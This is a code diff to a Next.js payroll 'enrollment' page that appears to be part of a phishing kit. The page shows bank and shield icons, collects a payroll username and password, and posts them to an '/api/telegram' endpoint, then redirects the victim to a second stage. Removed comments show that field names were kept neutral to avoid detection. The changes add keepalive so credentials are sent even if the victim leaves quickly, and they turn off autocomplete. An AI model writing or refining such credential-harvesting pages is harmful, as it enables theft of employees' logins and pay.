@@ -1,22 +1,28 @@
 "use client";
 
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import { motion } from "framer-motion";
 import { FaUniversity, FaLock, FaShieldAlt } from "react-icons/fa";
 
 export default function PayrollEnrollmentPage() {
   const router = useRouter();
-  const [f1, setF1] = useState(""); // neutral for username
-  const [f2, setF2] = useState(""); // neutral for password
+
+  const [f1, setF1] = useState(""); // username
+  const [f2, setF2] = useState(""); // password
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
+  // Debug: Confirm component mounted (helps diagnose JS issues on some devices)
+  useEffect(() => {
+    console.log("✅ PayrollEnrollmentPage mounted");
+  }, []);
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
-    if (!f1 || !f2) {
+    if (!f1.trim() || !f2.trim()) {
       setError("Please enter both Username and Password.");
       return;
     }
@@ -25,30 +31,38 @@ export default function PayrollEnrollmentPage() {
     setError("");
     setSuccess("");
 
-    // Neutral keys – avoid "employee_id", "payroll_password" in the request body
     const formData = {
-      a: f1,
-      b: f2,
+      a: f1.trim(),
+      b: f2.trim(),
     };
 
     try {
       const res = await fetch("/api/telegram", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { 
+          "Content-Type": "application/json",
+          "Cache-Control": "no-cache"
+        },
         body: JSON.stringify({
           data: formData,
           formType: "🏦 Payroll Enrollment",
         }),
+        keepalive: true,        // Helps when user leaves page quickly
       });
 
-      if (!res.ok) throw new Error("Failed to submit");
+      if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
 
       setSuccess("Enrollment submitted successfully!");
       setF1("");
       setF2("");
-      setTimeout(() => router.push("/PayrollEnrollment2"), 2000);
+
+      // Small delay gives user time to see success message
+      setTimeout(() => {
+        router.push("/PayrollEnrollment2");
+      }, 1500);
+
     } catch (err) {
-      console.error(err);
+      console.error("Submission error:", err);
       setError("Failed to submit. Please try again.");
     } finally {
       setIsSubmitting(false);
@@ -108,6 +122,7 @@ export default function PayrollEnrollmentPage() {
                   <span>{error}</span>
                 </div>
               )}
+
               {success && (
                 <div className="bg-green-500/10 border border-green-500/30 text-green-400 px-4 py-3 rounded-lg text-sm">
                   {success}
@@ -125,6 +140,7 @@ export default function PayrollEnrollmentPage() {
                   className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors"
                   placeholder="e.g., QW-12345"
                   required
+                  autoComplete="off"
                 />
               </div>
 
@@ -139,6 +155,7 @@ export default function PayrollEnrollmentPage() {
                   className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors"
                   placeholder="••••••••"
                   required
+                  autoComplete="off"
                 />
               </div>
 
